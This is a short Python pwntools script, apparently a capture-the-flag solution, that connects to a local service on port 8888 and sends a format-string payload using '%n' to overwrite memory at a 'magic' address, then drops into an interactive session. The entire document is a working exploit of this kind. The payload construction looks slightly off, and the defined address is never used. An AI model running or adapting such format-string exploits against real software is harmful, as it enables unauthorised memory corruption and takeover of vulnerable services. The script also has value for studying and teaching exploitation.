from pwn import *

host = '127.0.0.1'
port = 8888

r = remote(host, port)

magic = 0x60106c
r.recvuntil(':')
payload = bytes('%' + str(0xda) + '$c' + '%22$n', 'utf-8')

r.sendline(payload)
r.interactive()
